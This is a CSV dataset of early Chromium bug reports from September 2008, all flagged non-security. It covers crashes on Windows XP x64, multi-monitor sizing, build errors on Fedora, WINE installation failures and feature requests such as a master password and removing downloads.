,id,issue_id,date,report,Security,summary,description
47,47,49,2-Sep-08,Issue 49 : Attempting to open Chrome Options crashes in WinXP-64bit 18 problem? 1. Attempt to open the Configuration or any other submenu (attempt to set the homepage for example). Chrome will crash. Works fine under Windows XP 32-bit. 2. 3.  ? The control box that will allow me to set the options in Chrome. Home page  etc.  ? Crash message: Error signature AppName: chrome.exe AppVer: 0.0.0.0 ModName: unknown ModVer: 0.0.0.0 Offset: 00000000     ,0,Issue 49 : Attempting to open Chrome Options crashes in WinXP-64bit 18 problem,1. Attempt to open the Configuration or any other submenu (attempt to set the homepage for example). Chrome will crash. Works fine under Windows XP 32-bit. 2. 3.   The control box that will allow me to set the options in Chrome. Home page  etc.   Crash message: Error signature AppName: chrome.exe AppVer: 0.0.0.0 ModName: unknown ModVer: 0.0.0.0 Offset: 00000000     
48,48,50,2-Sep-08,Issue 50 : scrolling up with touchpad not working &nbsp;   &nbsp;   fduperier      : 0.2.149.27 (1583) URLs (if applicable) : all    : Safari 3: OK Firefox 3:OK IE 7: OK  ? 1. Scroll down the page with the touchpad 2. Try to scroll up  impossible 3.  ?  ?     ,0,Issue 50 : scrolling up with touchpad not working &nbsp,&nbsp fduperier      : 0.2.149.27 (1583) URLs (if applicable) : all    : Safari 3: OK Firefox 3:OK IE 7: OK   1. Scroll down the page with the touchpad 2. Try to scroll up  impossible 3.    
49,49,51,2-Sep-08,Issue 51 : Constant &quot;Unknown error&quot; pages 5 problem? 1. Occurs regularly during normal browsing  so I couldn't guarantee to reproduce the problem  but posting on forums always produces the error first time. 2. 3.  ?  ?     Whilst browsing I regularly receive the attached error page. Perhaps it has something to do with updating websites  perhaps not. chromeerror.jpg 68.7 KB &nbsp; View &nbsp; Download ,0,Issue 51 : Constant &quotUnknown error&quot,pages 5 problem 1. Occurs regularly during normal browsing  so I couldn't guarantee to reproduce the problem  but posting on forums always produces the error first time. 2. 3.    Whilst browsing I regularly receive the attached error page. Perhaps it has something to do with updating websites  perhaps not. chromeerror.jpg 68.7 KB &nbsp View &nbsp Download 
50,50,52,2-Sep-08,Issue 52 : Issues with css and tables 3 problem? 1. Go to the site mentioned in url. 2. Check out the several links to styles.  ? The tables to be shown correctly.  ? Tables are not shown correctly.     ,0,Issue 52 : Issues with css and tables 3 problem,1. Go to the site mentioned in url. 2. Check out the several links to styles.   The tables to be shown correctly.   Tables are not shown correctly.     
51,51,53,2-Sep-08,Issue 53 : No Master Password Option 41     &nbsp;   maxthelen      : 0.2.149.27 (1583) Needs an option to set a Master Password ,0,Issue 53 : No Master Password Option 41     &nbsp,maxthelen      : 0.2.149.27 (1583) Needs an option to set a Master Password 
52,52,54,2-Sep-08,Issue 54 : In Windows XP x64  Chrome crashes while opening Options. 1 person starred this issue and may be notified of changes.   &nbsp;   optimum.reflex      : 0.2.149.27 URLs (if applicable) :   Only a Chrome issue  : Safari 3: Firefox 3: IE 7:  ? 1. Windows XP x64 2. Chrome &gt; Options 3. Crash.  ? To open options.  ? Crashes.     ,0,Issue 54 : In Windows XP x64  Chrome crashes while opening Options. 1 person starred this issue and may be notified of changes.   &nbsp,optimum.reflex      : 0.2.149.27 URLs (if applicable) :   Only a Chrome issue  : Safari 3: Firefox 3: IE 7:   1. Windows XP x64 2. Chrome &gt Options 3. Crash.   To open options.   Crashes.     
53,53,55,2-Sep-08,Issue 55 : Full screen does not work on multiple screens 3 problem? 1. open the browser 2. maximize on secondary display Result: 1. maximizes to size of primary display Expected result: 1. Fills up whole screen Misc info: Win XP SP2  ?  ?     screenshot.JPG 200 KB &nbsp; View &nbsp; Download ,0,Issue 55 : Full screen does not work on multiple screens 3 problem,1. open the browser 2. maximize on secondary display Result: 1. maximizes to size of primary display Expected result: 1. Fills up whole screen Misc info: Win XP SP2    screenshot.JPG 200 KB &nbsp View &nbsp Download 
54,54,56,2-Sep-08,Issue 56 : google chrome crashes in Xp x64 SP 1 3 problem? 1. Just install google chrome on XP x64 SP1 and try to open the options from Tools  then chrome crashes and asks for a restart  ? The expected result should be that one should be shown the options that one can control in chrome  ? Instead the browser crashes and asks if u want to restart.     well the error messg is something like Whoa! Chrome has crashed  do you want to restart ? ,0,Issue 56 : google chrome crashes in Xp x64 SP 1 3 problem,1. Just install google chrome on XP x64 SP1 and try to open the options from Tools  then chrome crashes and asks for a restart   The expected result should be that one should be shown the options that one can control in chrome   Instead the browser crashes and asks if u want to restart.     well the error messg is something like Whoa! Chrome has crashed  do you want to restart  
55,55,57,2-Sep-08,Issue 57 : Can't build chromium on fedora 4 problem? 1. Follow build instructions here http://dev.chromium.org/developers/how-tos/build-instructions-linux 2. When you get to the gclient sync line  you get the error message below  ? No errors in the sync  ? Traceback (most recent call last): File &quot;/home/jweiss/chromium/depot_tools/release/gclient.py&quot;  line 927  in &lt;module&gt; result = Main(sys.argv) File &quot;/home/jweiss/chromium/depot_tools/release/gclient.py&quot;  line 923  in Main return DispatchCommand(command  options  args) File &quot;/home/jweiss/chromium/depot_tools/release/gclient.py&quot;  line 887  in DispatchCommand return command_map[command](options  args) File &quot;/home/jweiss/chromium/depot_tools/release/gclient.py&quot;  line 839  in DoUpdate return update_all(client  options  args) File &quot;/home/jweiss/chromium/depot_tools/release/gclient.py&quot;  line 715  in UpdateAll deps = get_all_deps(client  entries) File &quot;/home/jweiss/chromium/depot_tools/release/gclient.py&quot;  line 578  in GetAllDeps solution_deps = get_default_solution_deps(client  solution[&quot;name&quot;]) File &quot;/home/jweiss/chromium/depot_tools/release/gclient.py&quot;  line 539  in GetDefaultSolutionDeps deps = scope[&quot;deps&quot;] KeyError: 'deps'     Fedora 8  with all dependency packages installed ,0,Issue 57 : Can't build chromium on fedora 4 problem,1. Follow build instructions here http://dev.chromium.org/developers/how-tos/build-instructions-linux 2. When you get to the gclient sync line  you get the error message below   No errors in the sync   Traceback (most recent call last): File &quot /home/jweiss/chromium/depot_tools/release/gclient.py&quot line 927  in &lt module&gt result = Main(sys.argv) File &quot /home/jweiss/chromium/depot_tools/release/gclient.py&quot line 923  in Main return DispatchCommand(command  options  args) File &quot /home/jweiss/chromium/depot_tools/release/gclient.py&quot line 887  in DispatchCommand return command_map[command](options  args) File &quot /home/jweiss/chromium/depot_tools/release/gclient.py&quot line 839  in DoUpdate return update_all(client  options  args) File &quot /home/jweiss/chromium/depot_tools/release/gclient.py&quot line 715  in UpdateAll deps = get_all_deps(client  entries) File &quot /home/jweiss/chromium/depot_tools/release/gclient.py&quot line 578  in GetAllDeps solution_deps = get_default_solution_deps(client  solution[&quot name&quot ]) File &quot /home/jweiss/chromium/depot_tools/release/gclient.py&quot line 539  in GetDefaultSolutionDeps deps = scope[&quot deps&quot ] KeyError: 'deps'     Fedora 8  with all dependency packages installed 
56,56,58,2-Sep-08,Issue 58 : Full sizing browsesr 2 problem? 1. have a laptop with one screen at 1024:768 and another one at 1680:1050 then make the browser big on the big screen. 2. 3.  ? It should fill out the whole screen  ? It only fills out part of the screen seems to be the area of how big the primary screen is.     ,0,Issue 58 : Full sizing browsesr 2 problem,1. have a laptop with one screen at 1024:768 and another one at 1680:1050 then make the browser big on the big screen. 2. 3.   It should fill out the whole screen   It only fills out part of the screen seems to be the area of how big the primary screen is.     
57,57,59,2-Sep-08,Issue 59 : Does not install in WINE 5 problem? 1. WINEDEBUG=warn+all wine ChromeSetup.exe 2. 3.  ? installs  ? installs not     Hi  I know you can easily close this as invalid  but it seems the installation in wine crashes is related to missing file mscoree.dll (.NET library?)  so it is possible to be a valid problem in Windows as well. Please check that you either ship the mscoree.dll with the package or rather remove the dependency. ... warn:file:wine_nt_to_unix_file_name L&quot;mscoree.dll&quot; not found in /home/hajma/.wine/dosdevices/c:/windows/system32 warn:ntdll:NtQueryFullAttributesFile L&quot;\\??\\C:\\windows\\system32\\mscoree.dll&quot; not found (c0000034) warn:file:wine_nt_to_unix_file_name L&quot;mscoree.dll&quot; not found in /home/hajma/.wine/dosdevices/c:/windows warn:ntdll:NtQueryFullAttributesFile L&quot;\\??\\C:\\windows\\mscoree.dll&quot; not found (c0000034) err:seh:raise_exception Unhandled exception code c0000005 flags 0 addr 0x1804984f wine client error:22: write: Bad file descriptor ... ,0,Issue 59 : Does not install in WINE 5 problem,1. WINEDEBUG=warn+all wine ChromeSetup.exe 2. 3.   installs   installs not     Hi  I know you can easily close this as invalid  but it seems the installation in wine crashes is related to missing file mscoree.dll (.NET library )  so it is possible to be a valid problem in Windows as well. Please check that you either ship the mscoree.dll with the package or rather remove the dependency. ... warn:file:wine_nt_to_unix_file_name L&quot mscoree.dll&quot not found in /home/hajma/.wine/dosdevices/c:/windows/system32 warn:ntdll:NtQueryFullAttributesFile L&quot \\  \\C:\\windows\\system32\\mscoree.dll&quot not found (c0000034) warn:file:wine_nt_to_unix_file_name L&quot mscoree.dll&quot not found in /home/hajma/.wine/dosdevices/c:/windows warn:ntdll:NtQueryFullAttributesFile L&quot \\  \\C:\\windows\\mscoree.dll&quot not found (c0000034) err:seh:raise_exception Unhandled exception code c0000005 flags 0 addr 0x1804984f wine client error:22: write: Bad file descriptor ... 
58,58,60,2-Sep-08,Issue 60 : Add &quot;Remove&quot; to the menu on items in the download bar 225 problem? 1. Download any file 2. Click the down arrow near the file 3. ooops ... no way to get rid of it  ? Some method to get rid of downloaded files. Common use case is downloading a file  running it  then trashing it -- there is no way to trash files from within chrome. It requires opening the folder where it downloaded the files and deleting it from there. ,0,Issue 60 : Add &quotRemove&quotto the menu on items in the download bar 225 problem,1. Download any file 2. Click the down arrow near the file 3. ooops ... no way to get rid of it   Some method to get rid of downloaded files. Common use case is downloading a file  running it  then trashing it -- there is no way to trash files from within chrome. It requires opening the folder where it downloaded the files and deleting it from there. 
